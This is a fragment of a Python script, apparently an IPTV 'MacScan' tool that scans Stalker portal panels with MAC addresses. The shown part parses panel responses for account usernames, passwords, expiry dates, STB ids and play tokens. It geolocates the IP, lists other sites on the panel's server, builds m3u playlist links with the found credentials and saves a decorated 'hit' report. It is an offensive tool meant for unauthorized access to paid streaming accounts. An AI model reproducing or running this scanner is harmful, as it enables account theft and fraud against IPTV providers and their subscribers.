	            			if bag1==4:
	            			 	break
	            	bag1=0
	            	veri=str(res.text)
	            	#print(veri)
	            	acon="" 
	            	if 'active_cons' in veri:
	            		try:
			            	#print(veri)
			            	acon=""
			            	acon=veri.split('active_cons":')[1]
			            	acon=acon.split(',')[0]
			            	acon=acon.replace('"',"")
			            	
			            	mcon=veri.split('max_connections":')[1]
			            	mcon=mcon.split(',')[0]
			            	mcon=mcon.replace('"',"")
			            	
			            	status=veri.split('status":')[1]
			            	status=status.split(',')[0]
			            	status=status.replace('"',"")
			            	
			            	timezone=veri.split('timezone":"')[1]
			            	timezone=timezone.split('",')[0]
			            	timezone=timezone.replace("\/","/")
			            	
			            	realm=veri.split('url":')[1]
			            	realm=realm.split(',')[0]
			            	realm=realm.replace('"',"")
			            	#print(realm)
			            	portal=panel
			            	port=veri.split('port":')[1]
			            	port=port.split(',')[0]
			            	port=port.replace('"',"")
			            	
			            	user=veri.split('username":')[1]
			            	user=user.split(',')[0]
			            	user=user.replace('"',"")
			            	
			            	passw=veri.split('password":')[1]
			            	passw=passw.split(',')[0]
			            	passw=passw.replace('"',"")
			            	
			            	bitis=veri.split('exp_date":')[1]
			            	bitis=bitis.split(',')[0]
			            	bitis=bitis.replace('"',"")
			            	if bitis=="null":
			            		bitis="Unlimited"
			            	else:
			            		bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S'))
			            	bitis=bitis
	            		except:pass
	            	
	
	
	            	if not ip=="":
	            		utc_offset=""
	            		org1=""
	            		asn1=""
		            	url5="http://worldtimeapi.org/api/ip/"+ip
		            	while True:
		            		try:
		            			res = ses.get(url5, proxies =proxies,  timeout=15, verify=False)
		            			break
		            		except:
		            			bag1=bag1+1
		            			time.sleep(bekleme)
		            			if bag1==4:
		            				break
		            	
		            	try:
		            		bag1=0
		            		veri=str(res.text)
		            		abbreviation=veri.split('abbreviation":"')[1]
		            		abbreviation=abbreviation.split('"')[0]
		            		datetime=veri.split('datetime":"')[1]
		            		datetime=datetime.split('"')[0]
		            		utc_offset1=veri.split('utc_offset":"')[1]
		            		utc_offset1=str(utc_offset1.split('"')[0])
		            		
		            	except:pass
		            	url5="https://ipapi.co/"+ip+"/json/" 
		            	while True:
		            		try:
		            			res = ses.get(url5, proxies =proxies,  timeout=15, verify=False)
		            			break
		            		except:
		            			bag1=bag1+1
		            			time.sleep(bekleme)
		            			if bag1==4:
		            				break
		            	
		            	try:
		            		bag1=0
		            		languages="" 
		            		postal="" 
		            		Timezone=""
		            		country_name =""
		            		country_capital=""
		            		region=""
		            		city=""
		            		veri=str(res.text)
		            		#print(veri)
		            		Timezone=veri.split('timezone": "')[1]
		            		Timezone=Timezone.split('"')[0]
		            		country_code=veri.split('country_code": "')[1]
		            		country_code=country_code.split('"')[0]
		            		country_code_iso3=veri.split('country_code_iso3": "')[1]
		            		country_code_iso3=country_code_iso3.split('"')[0]
		            		continent_code=veri.split('continent_code": "')[1]
		            		continent_code=continent_code.split('"')[0]
		            		country_tld=veri.split('country_tld": "')[1]
		            		country_tld=country_tld.split('"')[0]
		            		country_name=veri.split('country_name": "')[1]
		            		country_name=country_name.split('"')[0]
		            		region=veri.split('region": "')[1]
		            		region=region.split('"')[0]
		            		city=veri.split('city": "')[1]
		            		city=city.split('"')[0]
		            		country_capital=veri.split('"country_capital": "')[1]
		            		country_capital=country_capital.split('"')[0]
		            		postal=veri.split('postal": "')[1]
		            		postal=postal.split('"')[0]
		            		utc_offset=veri.split('utc_offset": "')[1]
		            		utc_offset=utc_offset.split('"')[0]
		            		languages=veri.split('languages": "')[1]
		            		languages=languages.split('"')[0]
		            		org1=veri.split('"org": "')[1]
		            		org1=org1.split('"')[0]
		            		currency=veri.split('currency": "')[1]
		            		currency=currency.split('"')[0]
		            		asn1=veri.split('"asn": "')[1]
		            		asn1=asn1.split('"')[0]	
		            	except:pass
		            	url5="https://iplist.cc/api/"+ip
		            	while True:
		            		try:
		            			res = ses.get(url5, proxies =proxies, timeout=15, verify=False)
		            			break
		            		except:
		            			bag1=bag1+1
		            			time.sleep(bekleme)
		            			if bag1==4:
		            				break
		            	
		            	try:
		            		bag1=0
		            		veri=str(res.text)
		            		ServerISP=""
		            		if not 'title' in veri:
		            			ServerISP=veri.split('name": "')[1]
		            			ServerISP=ServerISP.split('"')[0]
		            			ServerRegistry=veri.split('registry": "')[1]
		            			ServerRegistry=ServerRegistry.split('"')[0]
		            			ServerLocation=veri.split('countryname": "')[1]
		            			ServerLocation=ServerLocation.split('"')[0]
		            		
		            	except:pass            	
	            	try:
	            		
	            		pal=panel.split(':')[0]
	            		pal=pal.replace('/stalker_portal','')
	            		yanpanel1="hata" 
		            	yanpanel="hata" 
		            	url= "http://ipv4info.com/?act=check&ip="+pal
		            	res = ses.get(url, timeout=15, verify=False)
		            	veri=str(res.text)
		            	yan=""
		            	yanlar=veri
		            	yanpanel="hata"
		            	if veri.count("Site info ")>0:
		            	    for i in veri.split('Site info ('):
		            	    	yan=yan+(i.split(')')[0])+" 🌎 "
		            	    	yanpanel=(yan.split('(')[1])
		            	else:
				   		       yan1=veri.split('href="/ip-address')[1]
				   		       yan1=yan1.split('">')[0]
				   		       url="http://ipv4info.com/ip-address"+yan1
				   		       res = ses.get(url, timeout=15, verify=False)
				   		       veri=str(res.text)
				   		       if veri.count("Site info ")>0:
				   		             for i in veri.split('Site info ('):
				   		              yan=yan+(i.split(')')[0])+" 🌎 "
				   		              yanpanel=(yan.split('(')[1])
				   		
				   	#else:
		            	if not realm==panel:
		            		pal=realm.split(':')[0]
		            		url= "http://ipv4info.com/?act=check&ip="+pal
		            		res = ses.get(url, timeout=15, verify=False)
		            		veri=str(res.text)
		            		yan=""
		            		yanpanel1="hata"
		            		if veri.count("Site info ")>0:
		            		   for i in veri.split('Site info ('):
		            		   	if yanpanel.count(i.split(')')[0])==0:
		            		   		yan=yan+(i.split(')')[0])+" 🌎 "
		            		   		yanpanel1=(yan.split('(')[1])
		            		else:
		            			yan1=veri.split('href="/ip-address')[1]
		            			yan1=yan1.split('">')[0]
		            			url="http://ipv4info.com/ip-address"+yan1
		            			res = ses.get(url, timeout=15, verify=False)
		            			veri=str(res.text)
		            			if veri.count("Site info ")>0:
				   		         for i in veri.split('Site info ('):
				   		          	  if yanpanel.count(i.split(')')[0])==0:
				   		          	   	yan=yan+(i.split(')')[0])+" 🌎 "
				   		          	   	yanpanel1=(yan.split('(')[1])
				   		
		            	if not yanpanel1=="hata" :
		            		yanpanel=yanpanel+yanpanel1
		            	yanpanel=yanpanel.replace(" 🌎  🌎 "," 🌎 ")
	            	except:pass
	            		
	            	
	            	mlink="http://"+ panel + "/get.php?username=" + userm + "&password=" + pasdm + "&type=m3u_plus"
	            	imzaa=""
	            	imzab=""
	            	imzak=""
	            
	            	if not fname=="":
	            		panell=panel+'/stalker_portal'
	            	else:
	            		panell=panel
	            	imzaip1=""
	            	imzaip2=""
	            	imzaip3=""
	            	
	            	if not ip=="":
	            		if not ServerISP=="":
	            			try:
	            				imzaip1=("""
╠•❖•𝗗𝗼𝗺𝗮𝗶𝗻𝗜𝗦𝗣••"""+ServerISP+"""
╠•❖•𝗦𝗲𝗿𝘃𝗲𝗿𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆•🢂"""+ServerRegistry+""" 
╠•❖•𝗦𝗲𝗿𝘃𝗲𝗿𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻•🢂"""+ServerLocation+"""""")
	            				imzaip2=("""
╠•❖•𝗦𝗰𝗮𝗻𝗧𝗶𝗺𝗲•🢂"""+str(datetime)+"""|​"""+str(abbreviation)+"""|​"""+str(utc_offset1)+"""""")
	            				imzaip3=("""
╠•❖•𝗖𝗹𝗶𝗲𝗻𝘁𝗜𝗣𝗔𝗱𝗿𝗲𝘀𝘀•🢂"""+ip+"""​ 
╠•❖•𝗖𝗹𝗶𝗲𝗻𝘁𝗧𝗶𝗺𝗲𝘇𝗼𝗻𝗲•🢂"""+Timezone+""" ​ 
╠•❖•𝗨𝗧𝗖𝗢𝗳𝗳𝘀𝗲𝘁•🢂"""+utc_offset+""" ​ 
╠•❖•𝗖𝗼𝘂𝗻𝘁𝗿𝘆•🢂"""+country_name+"""
╠•❖•𝗥𝗲𝗴𝗶𝗼𝗻•🢂"""+region+"""
╠•❖•𝗜𝗻𝘁𝗲𝗿𝗻𝗲𝘁𝗣𝗿𝗼𝘃𝗶𝗱𝗲𝗿•🢂"""+org1+"""
╠•❖•𝗔𝗦𝗡•🢂"""+asn1+"""|​𝗖𝗮𝗽𝗶𝘁𝗮𝗹•🢂"""+country_capital+"""​ 
╠•❖•𝗖𝗶𝘁𝘆•🢂"""+city+"""​|𝗣𝗼𝘀𝘁𝗮𝗹𝗖𝗼𝗱𝗲•🢂"""+postal+""" |𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲𝘀•🢂"""+languages+"""
╠•❖•🌟🌟️️•❖•MacScan•❖•🌟🌟•❖•""")
	            			except:pass	
	
	            	imza1=("""
╔╣ ✔Pʏᴛʜᴏɴ Mᴏʙɪʟᴇ Mᴀᴄ Sᴄᴀɴ ╠╗
╠•❖•🌟🌟️️•❖•MacScan•❖•🌟🌟•❖•
╠•❖•🅟🅞🅡🅣🅐🅛•🢂http://"""+panell+"""/c/
╠•❖•🅡🅔🅐🅛•🢂http://"""+real+"""/c
╠•❖•🅜🅐🅒•🢂"""+mac+"""
╠•❖•🅔🅧🅟🅘🅡🅐🅣🅘🅞🅝•🢂"""+trh+"""""")
	            	if not adult =="":
	            		imzaa=("""
╠•❖•ᴀᴄɴ•ɪᴅ•🢂"""+acount_id+"""
╠•❖•ꜱᴛʙ•ɪᴅ•🢂"""+stb_id+"""
╠•❖•ꜱᴛʙ•ᴛʏᴘᴇ•🢂"""+stb_type+"""
╠•❖•ᴄʟɪᴇɴᴛ•ᴛʏᴘᴇ•🢂"""+stb_c+"""
╠•❖•ᴀ.ᴘᴀꜱꜱ•🢂"""+adult+"""
╠•❖•ꜱ.ᴘᴀꜱꜱ•🢂"""+sespas+"""
╠•❖•ᴘʟᴀʏᴛᴏᴋᴇɴ•🢂"""+play_token+"""
╠•❖•ɪᴘ•🢂"""+ip+"""
╠•❖•ᴛɪᴍᴇᴢᴏɴᴇ•🢂"""+timezon.replace('\/','/')+"""
╠•❖•ʟᴏᴄᴀʟ•🢂"""+tloca+"""
╠•❖•🌟🌟️️•❖•MacScan•❖•🌟🌟️•❖•""")
	            		if not fname=="":
	            			imzaa=("""
╠•❖•User•🢂"""+user+"""
╠•❖•Pass•🢂"""+passw+"""
╠•❖•StbID•🢂"""+stb_id+"""
╠•❖•StbType•🢂"""+stb_type+"""
╠•❖•INFO•🢂"""+fname+"""
╠•❖•A.Pass•🢂"""+adult+"""
╠•❖•S.Pass•🢂"""+sespas+"""
╠•❖•PlanID•🢂"""+tplan+"""
╠•❖•TrarrifPlan•🢂"""+tarrif+"""
╠•❖•TimeZone•🢂"""+timezon.replace('\/','/')+"""
╠•❖•IP•🢂"""+ip+"""""")
	            			
	            			
	            			
		   #except:pass
	            	imza2=""
	            	if not acon=="":
	            		imza2=("""
╠•❖•𝗛𝗼𝘀𝘁•🢂http://"""+portal+"""/c/
╠•❖•𝐑𝐞𝐚𝐥•🢂http://"""+realm+""":"""+port+"""/c
╠•❖•𝗣𝗼𝗿𝘁•🢂"""+port+"""
╠•❖•𝗨𝘀𝗲𝗿•🢂"""+user+"""
╠•❖•𝗣𝗮𝘀𝘀•🢂"""+passw+"""
╠•❖•𝗘𝘅𝗽𝗶𝗿𝗮𝐭𝐢𝐨𝐧•🢂"""+bitis+""" 
╠•❖•𝐀𝐜𝐭𝐢𝐯𝐞𝐂𝐨𝐧•🢂"""+acon+"""
╠•❖•𝗠𝗮𝘅𝗶𝗺𝘂𝗺𝗖𝗼𝗻•🢂"""+mcon+""" 
╠•❖•𝗦𝘁𝗮𝘁𝘂𝘀•🢂"""+status+"""
╠•❖•𝗧𝗶𝗺𝗲𝗭𝗼𝗻𝗲•🢂"""+timezone+"""
╠•❖•𝐂𝐡𝐚𝐧𝐧𝐞𝐥𝐬𝐂𝐨𝐮𝐧𝐭•🢂"""+kanalsayisi+"""
╠•❖•𝗩𝗼𝗱𝗖𝗼𝘂𝗻𝘁•🢂"""+filmsayisi+"""
╠•❖•𝗦𝗲𝗿𝗶𝗲𝘀𝗖𝗼𝘂𝗻𝘁•🢂"""+dizisayisi+"""""")
	            	imzasif=("""
╠•❖•𝗦𝗲𝗿𝗶𝗮𝗹•🢂"""+SNENC+"""
╠•❖•𝗦𝗲𝗿𝗶𝗮𝗹𝗖𝘂𝘁•🢂"""+SNCUT+"""
╠•❖•𝗗𝗲𝘃𝗶𝗰𝗲𝗜𝗗❶•🢂"""+DEVENC+"""
╠•❖•𝗗𝗲𝘃𝗶𝗰𝗲𝗜𝗗❷•🢂"""+SINGENC+"""""")
	            	imza3=("""
╠•❖•🅜❸🅤•🢂 """+mlink+"""
╠•❖•ᴘʏᴛʜᴏɴ ★-★ ᴘʏ ᴄᴏɴғɪɢ•❖•""")
	            	#print(yanpanel)
	            	if not yanpanel=="hata":
	            		imzayan=("""
╠•❖•🅢🅘🅓🅔🅟🅞🅡🅣🅐🅛🅢•🢂"""+yanpanel.replace(" ✦","\n╠•❖•✦")+"""""" """ ️""")
	            	if kanalkata=="1" or kanalkata =="2":
	            		imzab=("""
╠•❖•❂❂❂❂❂⚡️⚡️⚡️⚡️⚡❂❂❂❂❂
╠•❖•🅒🅗🅐🅝🅝🅔🅛🅢•🢂📽           		
╠•❖•"""+kategori+""" """)
	#⚡️✨💫
	            	if kanalkata =="2":
	            		imzak=("""
╠•❖•🅥🅞🅓•🢂📽 
╠•❖•"""+kategoriv+"""
╠•❖•🅢🅔🅡🅘🅔🅢•🢂📽 
╠•❖•"""+kategoris+""" """)
	            	imzas=("""
╚═♨↘ᴾʸᵗʰᵒⁿ ᴹᵒᵈᵈᵉᵈ ᵇʸ ⁱˢʳᵃᵉˡˡᵖᶻ¹↙♨══╝""")
	            	imza=imza1+imzaa+imza2+imzaip1+imzaip2+imzaip3+imzasif+imzayan+imza3+imzab+imzak+imzas
	            	#print(imza)
            	else:
            		imza=("""╔╣ ✔Pʏᴛʜᴏɴ Mᴏʙɪʟᴇ Mᴀᴄ Sᴄᴀɴ ╠╗
╠•❖•𝕻𝖔𝖗𝖙𝖆𝖑•🢂http://"""+panel+"""/c/
╠•❖•𝕸𝖆𝖈•🢂"""+mac+"""
╠•❖•𝕰𝖝𝖕𝖎𝖗𝖆𝖙𝖎𝖔𝖓•🢂"""+trh+"""
╠•❖•🌟🌟️️•❖•MacScan•❖•🌟🌟️•❖•""" """  """)
            			            	
            	yaz(imza+'\n'+'\n')
            	print(imza)
	            	#print("********")
		##except:pass
		   
	if not ozelmac=="":
		quit()
		
	
		
	
		
		
	
